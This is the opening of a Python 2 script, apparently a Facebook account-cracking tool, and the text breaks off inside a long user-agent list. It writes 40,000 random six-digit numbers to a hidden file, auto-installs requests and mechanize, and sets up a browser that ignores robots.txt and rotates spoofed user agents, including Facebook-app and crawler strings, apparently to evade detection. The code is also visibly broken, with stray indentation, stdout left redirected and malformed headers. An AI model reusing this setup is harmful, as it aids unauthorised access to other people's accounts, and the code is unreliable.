#Auther Alienrazor  
 #python2 script 2022 
  
 
P = '\x1b[1;97m'

M = '\x1b[1;91m'

H = '\x1b[1;92m'

K = '\x1b[1;93m'

B = '\x1b[1;94m'

U = '\x1b[1;95m' 

O = '\x1b[1;96m'

N = '\x1b[0m'    

Z = "\033[1;30m"

sir = '\033[41m\x1b[1;97m'

x = '\33[m' # DEFAULT

m = '\x1b[1;91m' #RED +

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +
 

 
 
 
 
  
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass 
 os.system('rm -rf .txt') 
 for n in range(40000): 
     nmbr = random.randint(111111, 999999) 
     sys.stdout = open('.txt', 'a') 
     print nmbr 
     sys.stdout.flush() 
  
 try: 
     import requests 
 except ImportError: 
     os.system('pip2 install requests') 
  
 try: 
     import mechanize 
 except ImportError: 
     os.system('pip2 install mechanize') 
     time.sleep(1) 
     os.system('python2 C') 
  
 from multiprocessing.pool import ThreadPool 
 from requests.exceptions import ConnectionError 
 from mechanize import Browser 
 reload(sys) 
 sys.setdefaultencoding('utf8') 
 br = mechanize.Browser() 
 br.set_handle_robots(False) 
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1) 
 br.addheaders = ([ 
                         'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
                           'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)', 
   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 
   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)', 
   'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2', 
   'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 
   'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 
   'Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0', 
   'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)', 
   'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)', 
   'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 
   'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36', 
   'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 
   'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36', 
   'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 
   'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER', 
   'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0', 
   'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0', 
   'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0', 
   'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0', 
   'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 
   'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0', 
   'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0', 
   'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)', 
   'Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36', 
   'Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36', 
   'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0', 
   'Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2', 
   'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)', 
   'Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', 
   'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7', 
   'MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0', 
   'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0', 
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36', 
   'Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36', 
   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)', 
   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763', 
   'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)', 
   'Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1', 
   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1', 
   'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 
   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)', 
   'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0', 
   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)', 
   'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36', 
   'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)', 
   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362', 
   'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko', 
   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)', 
   'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 
   'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36', 
   'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063', 
   'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko', 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36', 
   'Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0', 
   'Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)', 
   'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 
   'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)', 
   'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)', 
   'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)', 
   'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)', 
   'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 
   'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)', 
   'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)', 
   'Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 
   'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0', 
   'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0', 
   'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0', 
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g', 
